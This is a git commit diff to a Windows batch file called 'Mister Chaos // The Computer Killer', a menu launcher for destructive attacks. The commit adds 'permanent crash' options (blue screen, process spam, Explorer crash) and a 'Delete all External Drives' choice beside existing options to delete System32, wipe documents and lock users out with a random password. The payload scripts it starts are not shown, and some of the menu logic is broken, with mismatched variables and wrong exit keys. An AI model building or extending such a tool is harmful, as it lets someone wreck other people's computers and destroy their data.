92dcee69bed1e41efd026650c1b391d309398744
Webious_ <37440099+Webious@users.noreply.github.com>
2020-02-15 22:46:26 +0100

    Adding PermaCrash

--- #Mister_Chaos.bat
+++ #Mister_Chaos.bat
@@ -1,5 +1,6 @@
 @echo off
 cls
+title Mister Chaos // The Computer Killer (By Webious_)
 goto menu
 
 REM MENU
@@ -14,6 +15,7 @@ echo  #  1. Bombing Attacks                      #
 echo  #  2. Crash Attacks                        #
 echo  #  3. Privilage Escalation                 #
 echo  #  4. Destruction Attacks                  #
+echo  #  5. Permanent Crash Attacks              #
 echo  #  q. (EXIT)                               #
 echo  [==========================================] 
 echo                               By Webious_ (c)
@@ -23,8 +25,9 @@ REM SelectMenu
 set /p selectmenu=
 if %selectmenu% == 1 goto menu_bombing
 if %selectmenu% == 2 goto menu_crash
-if %selectmenu% == 3 goto menu_escalation
+if %selectmenu% == 3 goto menu_privilage
 if %selectmenu% == 4 goto menu_destruction
+if %selectmenu% == 5 goto menu_permacrash
 if %selectmenu% == q goto exit
 ) else (
 goto menu
@@ -56,7 +59,7 @@ if %SelectMenu_Bombing% == 2 goto folder_bombing
 if %SelectMenu_Bombing% == 3 goto file_bombing
 if %SelectMenu_Bombing% == 4 goto browser_bombing
 if %SelectMenu_Bombing% == 5 goto cmd_bombing
-if %SelectMenu_Bombing% == q goto menu
+if %SelectMenu_Bombing% == m goto menu
 ) else (
 goto menu_bombing
 )
@@ -114,7 +117,7 @@ set /p SelectMenu_Crash=
 if %SelectMenu_Crash% == 1 goto bluescreen_crash
 if %SelectMenu_Crash% == 2 goto spamprocess_crash
 if %SelectMenu_Crash% == 3 goto porn_crash
-if %SelectMenu_Crash% == q goto menu
+if %SelectMenu_Crash% == m goto menu
 ) else (
 goto menu_crash
 )
@@ -138,51 +141,50 @@ pause
 goto menu_crash
 REM ==================================================================================================
 
-REM MENU_ESCALATION_3
+REM MENU_PRIVILAGE_3
 REM ==================================================================================================
-:menu_escalation
+:menu_privilage
 color 0D
 cls
 echo.
 echo  [==========================================]
-echo  #        Privilage Escalation Attacks      #
+echo  #             Privilage Attacks            #
 echo  [==========================================]
 echo  #  1. New Admin Session                    #
 echo  #  2. Lock out with random Password        #
-echo  #  3. TEST                                 #
 echo  #  q. (Back to Main Menu)                  #
 echo  [==========================================] 
 echo.
 echo   Enter Selection_
 
-REM SelectMenu_Escalation
-set /p SelectMenu_Escalation=
-if %SelectMenu_Escalation% == 1 goto admin_escalation
-if %SelectMenu_Escalation% == 2 goto passrandom_escalation
+REM SelectMenu_Privilage
+set /p SelectMenu_Privilage=
+if %SelectMenu_Privilage% == 1 goto admin_privilage
+if %SelectMenu_Escalation% == 2 goto passrandom_privilage
 if %SelectMenu_Escalation% == 3 goto test
-if %SelectMenu_Escalation% == q goto menu
+if %SelectMenu_Escalation% == m goto menu
 ) else (
-goto menu_escalation
+goto menu_privilage
 )
 
-REM ADMIN_ESCALATION
-:admin_escalation
-start admin_escalation.bat
+REM ADMIN_PRIVILAGE
+:admin_privilage
+start admin_privilage.bat
 pause
-goto menu_escalation
+goto menu_privilage
 
-REM PASSRANDOM_ESCALATION
-:passrandom_escalation
-start passrandom_escalation.bat
+REM PASSRANDOM_PRIVILAGE
+:passrandom_privilage
+start passrandom_privilage.bat
 pause
-goto menu_escalation
+goto menu_privilage
 
 REM TEST
 :test
 cd "/bin"
 start test.bat
 pause
-goto menu_escalation
+goto menu_privilage
 REM ==================================================================================================
 
 REM MENU_DESTRUCTION_4
@@ -197,6 +199,7 @@ echo  [==========================================]
 echo  #  1. Delete Sys32                         #
 echo  #  2. Delete all document files            #
 echo  #  3. Delete File Explorer                 #
+echo  #  4. Delete all External Drives           #
 echo  #  q. (Back to Main Menu)                  #
 echo  [==========================================] 
 echo.
@@ -207,7 +210,8 @@ set /p SelectMenu_Destruction=
 if %SelectMenu_Destruction% == 1 goto sys32_destruction
 if %SelectMenu_Destruction% == 2 goto delfile_destruction
 if %SelectMenu_Destruction% == 3 goto explorer_destruction
-if %SelectMenu_Destruction% == q goto menu
+if %SelectMenu_Destruction% == 4 goto drive_destruction
+if %SelectMenu_Destruction% == m goto menu
 ) else (
 goto menu_destruction
 )
@@ -229,8 +233,59 @@ REM EXPLORER_DESTRUCTION
 start explorer_destruction.bat
 pause
 goto menu_destruction
+
+REM DRIVE_DESTRUCTION
+:drive_destruction
+start drive_destruction.bat
+pause
+goto menu_destruction
 REM ==================================================================================================
 
+REM MENU_PERMACRASH_5
+REM ==================================================================================================
+:menu_permacrash
+color 0D
+cls
+echo.
+echo  [==========================================]
+echo  #          Permanent Crash Attacks         #
+echo  [==========================================]
+echo  #  1. Blue Screen (PERMA)                  #
+echo  #  2. Spam Process (PERMA)                 #
+echo  #  3. Explorer Crash (PERMA)               #
+echo  #  q. (Back to Main Menu)                  #
+echo  [==========================================] 
+echo.
+echo   Enter Selection_
+
+REM SelectMenu_Permacrash
+set /p SelectMenu_Permacrash=
+if %SelectMenu_Permacrash% == 1 goto bluescreen_permacrash
+if %SelectMenu_Permacrash% == 2 goto spamprocess_permacrash
+if %SelectMenu_Permacrash% == 3 goto explorer_permacrash
+if %SelectMenu_Permacrash% == m goto menu
+) else (
+goto menu_permacrash
+)
+
+REM BLUESCREEN_PERMACRASH
+:bluescreen_permacrash
+start bluescreen_permacrash.bat
+pause
+goto menu_permacrash
+
+REM SPAMPROCESS_PERMACRASH
+:spamprocess_permacrash
+start spamprocess_permacrash.bat
+pause
+goto menu_permacrash
+
+REM PORN_PERMACRASH
+:explorer_permacrash
+start explorer_permacrash.bat
+pause
+goto menu_crash
+REM ==================================================================================================
 
 REM EXIT
 :exit
